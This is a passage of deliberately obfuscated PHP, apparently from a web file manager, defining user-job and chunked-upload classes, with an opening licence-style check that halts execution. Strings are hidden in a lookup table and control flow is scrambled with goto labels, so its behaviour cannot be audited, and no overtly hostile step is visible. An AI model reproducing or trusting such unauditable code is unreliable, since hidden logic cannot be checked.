$Aڐ = 0; } goto Aё; bƓ: } } goto aג; aǌ: } } if ($_SERVER[$_SERVER[拘][33]] != $_SERVER[$_SERVER[拘][1256]]) { goto aᓆ; aᓆ: $fк = $_SERVER[拘][34]; $Eо薩 = BASIC_PATH . $_SERVER[拘][35]; $Eы옑 = $fк($Eо薩); goto Eڃ; cܟއ: $aй($_SERVER[$_SERVER[拘][1257]]); goto B; Eڃ: $FᐶӞ = $_SERVER[拘][4]($_SERVER[拘][36], $Eы옑); if ($_SERVER[拘][37]($FᐶӞ) < $_SERVER[拘][38]) { die; } $aй = $_SERVER[拘][39]; goto cܟއ; B: } goto eե; CǇ: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\x2e\152\x6f\x62\114\151\x73\x74"; public $field = array("\x6e\141\x6d\145", "\x64\x65\163\x63", "\x73\157\162\164"); const JOB_KEY = "\163\145\x6c\146\x4a\157\x62\x4c\151\x73\164"; public function listData($dڅ = false, $c͐ = "\163\157\x72\x74", $A΄ϛ = false) { return parent::listData($dڅ, $c͐, $A΄ϛ); } public function remove($E׾) { return parent::remove($E׾); } public function add($F, $c҆ = '') { $F囏 =& $_SERVER[拘]; if ($this->{$_SERVER[拘][1461]}($F)) { return !1; } $FЪ = parent::listData(); $fƈ = $F囏[413]($FЪ, $F囏[67], $F囏[1476]); $dß = array($F囏[1453] => $F, $F囏[1491] => $c҆, $F囏[1476] => empty($fƈ) ? 0 : $F囏[1143]($fƈ) + 1); return parent::insert($dß); } public function update($eɰ, $BƧ, $c = '') { $f𼞉 =& $_SERVER[拘]; $CĨڧ = parent::listData($eɰ); $A = $this->{$_SERVER[拘][1461]}($BƧ); if (!$CĨڧ || $A && $A[$f𼞉[414]] != $CĨڧ[$f𼞉[414]]) { return !1; } return parent::update($eɰ, array($f𼞉[1453] => $BƧ, $f𼞉[1491] => $c)); } public function setUserJob($e֩, $c˼ܘ) { goto eх; eх: $Dۙ =& $_SERVER[拘]; if (!$Dۙ[93]($c˼ܘ)) { $c˼ܘ = array($c˼ܘ); } $Bɞ = parent::listData(); goto D؊ʈ; D؊ʈ: $C檍 = $Dۙ[413]($Bɞ, $Dۙ[375]); $D㠌 = $Dۙ[1168]; foreach ($c˼ܘ as $Cѭ) { if ($C檍[$Cѭ]) { $D㠌 .= $C檍[$Cѭ][$Dۙ[414]] . $Dۙ[119]; } else { $bƝ = $this->{$_SERVER[拘][63]}($Cѭ); $D㠌 .= $bƝ . $Dۙ[119]; } } goto c; c: $D㠌 = $Dۙ[43]($D㠌, $Dۙ[119]); $Dۙ[64]($Dۙ[1513])->{$_SERVER[拘][1689]}($e֩, self::JOB_KEY, $D㠌); goto d϶; d϶: } public function getUserJob($C) { $bߧ =& $_SERVER[拘]; $f̤ = $bߧ[64]($bߧ[1513])->{$_SERVER[拘][1690]}($C); return $this->{$_SERVER[拘][1691]}($f̤[self::JOB_KEY]); } public function getUserJobInfo($B؎џ) { goto Bȶ; fߎ: $C¬ = $C̲[1692]($C¬, $C̲[558]); $b = array(); foreach ($c喢 as $E) { if (isset($C¬[$E])) { $b[] = $C¬[$E]; } } goto cȬ; Bȶ: $C̲ =& $_SERVER[拘]; $c喢 = $C̲[4]($C̲[119], $B؎џ); $C¬ = parent::listData(); goto fߎ; cȬ: return $b; goto B󖞬; B󖞬: } public function sort($AŴ, $fĴ) { $a =& $_SERVER[拘]; $fɵ = $this->{$_SERVER[拘][504]}(); $fĴ = $fĴ == $a[1601] ? $a[1693] : $a[1694]; $fɵ = $a[1695]($fɵ, $a[414], $AŴ, $fĴ); foreach ($fɵ as $c޶˸ => $E) { parent::update($E[$a[414]], array($a[1454] => $c޶˸)); } return !0; } } $_SERVER[拘][0]($_SERVER[拘][1696], $_SERVER[拘][1697]); $_SERVER[$_SERVER[拘][1698]] = $_SERVER[拘][4]($_SERVER[拘][1699], $_SERVER[拘][6]($_SERVER[拘][7]($_SERVER[拘][1700], 10, -8))); goto e; C楾: class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto aߑ; aߑ: $fў =& $_SERVER[拘]; global $in; $this->in =& $in; goto B; E֦: $this->{$_SERVER[拘][2381]}(); goto E묥ʹ; B: if (!empty($_FILES)) { $Dß靍 = $_FILES[$fў[18]]; $this->uploadFile = $Dß靍[$fў[2375]]; $this->fileName = $this->{$_SERVER[拘][2376]}($Dß靍[$fў[1453]]); if (isset($in[$fў[1453]])) { $this->fileName = $this->{$_SERVER[拘][2376]}($in[$fў[1453]]); } if (!$this->uploadFile && $Dß靍[$fў[953]] > 0) { $fў[29]($this->{$_SERVER[拘][1250]}($Dß靍[$fў[953]]), !1); } } else { if (isset($in[$fў[1453]])) { $this->uploadFile = isset($in[$fў[2377]]) ? $fў[2378] : $fў[2379]; $this->fileName = $this->{$_SERVER[拘][2376]}($in[$fў[1453]]); } } $this->statusData = !1; $this->{$_SERVER[拘][2380]}(); goto E֦; E묥ʹ: } public function upload() { goto fςθ; aǂ: if (!$this->{$_SERVER[拘][2402]}($Eȸ)) { $this->{$_SERVER[拘][2391]}($dݧݗҕ[2403], !1); } CacheLock::unlock($this->tempFile); $this->{$_SERVER[拘][2387]}(!1); goto C; E: $Fѷ = IO::hashSimple($C欝); $eׂ = IO::size($C欝); @$dݧݗҕ[51]($C欝); goto d; e֩ę: CacheLock::lock($this->tempFile, 20); $Eȸ = $this->{$_SERVER[拘][2389]}(); $this->{$_SERVER[拘][2390]}(); goto fЇ; E: $bȎ = $this->tempFile . $dݧݗҕ[2384] . $e۶; $eׂ = isset($this->in[$dݧݗҕ[1730]]) ? $dݧݗҕ[455]($this->in[$dݧݗҕ[1730]]) : 0; $fԗ = isset($this->in[$dݧݗҕ[2385]]) ? $dݧݗҕ[455]($this->in[$dݧݗҕ[2385]]) : 0; goto e㜨; bԈ: $this->{$_SERVER[拘][2387]}($Eȸ); if ($dݧݗҕ[37]($Eȸ[$dݧݗҕ[2398]]) != $Eȸ[$dݧݗҕ[2397]]) { $this->{$_SERVER[拘][2391]}($dݧݗҕ[2401] . $e۶, !0); } $dݧݗҕ[376](); goto aǂ; d: if (!$b㷑) { $this->{$_SERVER[拘][2391]}($dݧݗҕ[2396] . $e۶, !1); } $Eȸ[$dݧݗҕ[2397]] = $cМ; $Eȸ[$dݧݗҕ[2398]][$dݧݗҕ[2399] . $e۶] = array($dݧݗҕ[2400] => $c팤ĉ, $dݧݗҕ[734] => $e۶, $dݧݗҕ[490] => $eׂ, $dݧݗҕ[703] => $Fѷ); goto bԈ; fЇ: $C欝 = $this->{$_SERVER[拘][2388]}($bȎ); if (!$C欝) { $this->{$_SERVER[拘][2391]}($dݧݗҕ[387]($dݧݗҕ[2392]), !1); } $c팤ĉ = $e۶ * $this->in[$dݧݗҕ[2393]]; goto cދ; C: return $this->tempFile; goto Cԑ; e㜨: if (!isset($this->in[$dݧݗҕ[1730]]) || !isset($this->in[$dݧݗҕ[2385]])) { $dݧݗҕ[29]($dݧݗҕ[2386], !1); } if ($fԗ > $eׂ) { $cМ = 1; } if ($cМ <= 1) { $this->tempFile = $this->tempFile . $dݧݗҕ[405](5); $this->{$_SERVER[拘][2387]}(!1); return $this->{$_SERVER[拘][2388]}($this->tempFile); } goto e֩ę; cދ: $Cܓ = @$dݧݗҕ[53]($this->tempFile, $dݧݗҕ[2394]); $dݧݗҕ[576]($Cܓ, $c팤ĉ); $b㷑 = $this->{$_SERVER[拘][2395]}($C欝, $Cܓ); goto E; fςθ: $dݧݗҕ =& $_SERVER[拘]; $e۶ = isset($this->in[$dݧݗҕ[2382]]) ? $dݧݗҕ[455]($this->in[$dݧݗҕ[2382]]) : 0; $cМ = isset($this->in[$dݧݗҕ[2383]]) ? $dݧݗҕ[455]($this->in[$dݧݗҕ[2383]]) : 1; goto E; Cԑ: } private function checkSize() { $B͂܉ =& $_SERVER[拘]; if ($B͂܉[2404]() || $this->in[$B͂܉[490]] < PHP_INT_MAX) { return; } $B͂܉[29]($B͂܉[387]($B͂܉[2405]), !1); } private function showJson($CΡ, $b򤢩) { CacheLock::unlock($this->tempFile); $_SERVER[拘][29]($CΡ, $b򤢩); } public function clearData() { $Eפ =& $_SERVER[拘]; $this->{$_SERVER[拘][2387]}(!1); if ($Eפ[48]($this->tempFile)) { @$Eפ[51]($this->tempFile); return; } } private function tempPathInit() { goto cޡ; D鵛֞: $this->tempFile = $cֹ . $B[2407] . $B[46]($D . $this->in[$B[2393]]); goto Eר; B: $B[584]($cֹ . $B[1440]); $D = isset($this->in[$B[2406]]) ? $this->in[$B[2406]] : !1; if ($B[195]($D) < 30) { $D = $B[46](USER_ID . $this->in[$B[40]] . $this->fileName . $this->in[$B[490]]); } goto D鵛֞; cޡ: $B =& $_SERVER[拘]; $cֹ = TEMP_FILES; @$B[403]($cֹ); goto B; Eר: } private function moveUploadedFile($A) { $e =& $_SERVER[拘]; $EùȦ = $this->uploadFile; if ($EùȦ == $e[2408]) { @$e[344]($A, $e[2112]($_REQUEST[$e[2409]])); } else { if ($EùȦ == $e[2379]) { $F˥ = @$e[53]($A, $e[2216]); $this->{$_SERVER[拘][2395]}($EùȦ, $F˥); } else { if (!$e[2410]($EùȦ, $A)) { return !1; } } } return $A; } private function writeTo($b, $Cލ膃) { goto d; Cߣ: $D͘[58]($Eد߷); $D͘[58]($Cލ膃); return !0; goto bҠԚ; d: $D͘ =& $_SERVER[拘]; $Eد߷ = @$D͘[53]($b, $D͘[2215]); $Aؖ㴩 = $D͘[56]($Cލ膃, LOCK_EX); goto f݆آ; f݆آ: if (!$Eد߷ || !$Cލ膃 || !$Aؖ㴩) { return !1; } while (!$D͘[2218]($Eد߷)) { $D͘[55]($Cލ膃, $D͘[577]($Eد߷, 1024 * 200)); } $D͘[56]($Cލ膃, LOCK_UN); goto Cߣ; bҠԚ: } private function statusGet() { goto bӦ; bӦ: $d =& $_SERVER[拘]; if ($d[93]($this->statusData)) { return $this->statusData; } $f = $this->tempFile . $d[2411]; goto F; F: $fݰ = !1; if ($d[48]($f)) { $fݰ = @$d[345]($f); } if ($fݰ) { $this->statusData = $d[298]($fݰ); } goto B; B: if (!$this->statusData) { $Eی = array($d[375] => $this->fileName, $d[2397] => 0, $d[2398] => array()); $this->{$_SERVER[拘][2387]}($Eی); } return $this->statusData; goto eհԩ; eհԩ: } public function statusSet($C۱) { $b̟ =& $_SERVER[拘]; $F҅ = $this->tempFile . $b̟[2411]; if (!$C۱) { if ($b̟[48]($F҅)) { @$b̟[51]($F҅); } return !0; } $this->statusData = $C۱; return $b̟[344]($F҅, $b̟[264]($C۱)); } private function initFileTemp() { $EƮ޴ =& $_SERVER[拘]; if ($EƮ޴[48]($this->tempFile)) { return; } $dպ = $EƮ޴[53]($this->tempFile, $EƮ޴[2412]); $EƮ޴[576]($dպ, $this->in[$EƮ޴[490]] - 1, SEEK_SET); $EƮ޴[55]($dպ, $EƮ޴[163]); $EƮ޴[58]($dպ); } public function checkChunk() { goto Aٓ; d: $bĢ = $this->{$_SERVER[拘][2389]}(); CacheLock::unlock($this->tempFile); foreach ($bĢ[$d؊[2398]] as $Aؕ) { $DǼ = $Aؕ[$d؊[703]]; if ($DǼ) { $C㔍[$d؊[2413] . $Aؕ[$d؊[734]]] = $DǼ; } } goto c䕒; Aٓ: $d؊ =& $_SERVER[拘]; $C㔍 = array(); CacheLock::lock($this->tempFile); goto d; c䕒: return $C㔍; goto B̆; B̆: } private function checkChunkHash($f) { goto Aώ; Aώ: $D =& $_SERVER[拘]; if ($D[37]($f[$D[2398]]) != $f[$D[2397]]) { return !1; } $C״ = $D[1404]($this->in, $D[2406]); goto B; dŴ: return $Eږ،; goto D׎; B: $aީ = $D[1404]($this->in, $D[2414]); if ($D[195]($aީ) == 32 && IO::hashSimple($this->tempFile) == $C״ && IO::hashMd5($this->tempFile) == $aީ) { return !0; } $c = $D[53]($this->tempFile, $D[575]); goto e; e: $Eږ، = !0; foreach ($f[$D[2398]] as $e) { $D[576]($c, $e[$D[2400]]); $F䍔 = $D[977]::hash($c, $e[$D[490]]); if ($e[$D[703]] != $F䍔) { $Eږ، = !1; break; } } $D[58]($c); goto dŴ; D׎: } private function parseName($E͐) { goto Cʤ懂; a鼬: $Dд̔ = $DΊդ[671]($this->in[$DΊդ[2417]]); $Dд̔ = $Dд̔ ? $Dд̔ : $DΊդ[50](); $B = $DΊդ[80]($E͐); goto fөʡ; fөʡ: if ($B == $DΊդ[2418] || $B == $DΊդ[2419]) { $E͐ = $DΊդ[908]($DΊդ[823], $Dд̔) . $DΊդ[183] . $this->in[$DΊդ[490]] . $DΊդ[2420]; } else { if ($B == $DΊդ[2421]) { $E͐ = $DΊդ[908]($DΊդ[823], $Dд̔) . $DΊդ[183] . $this->in[$DΊդ[490]] . $DΊդ[2422]; } } return $E͐; goto AБߪ; Cʤ懂: $DΊդ =& $_SERVER[拘]; $E͐ = $DΊդ[69](array($DΊդ[338], $DΊդ[44]), array($DΊդ[44], $DΊդ[348]), $DΊդ[70]($E͐)); if (!$DΊդ[2416]()) { return $E͐; } goto a鼬; AБߪ: } private function errorInfo($f꼂) { $eކã =& $_SERVER[拘]; $Cג癄 = array($eކã[2423], $eކã[2424], $eކã[2425], $eކã[2426], $eކã[2427], $eކã[2428], $eކã[2429], $eކã[2430]); return $f꼂 . $eކã[91] . $Cג癄[$f꼂]; } }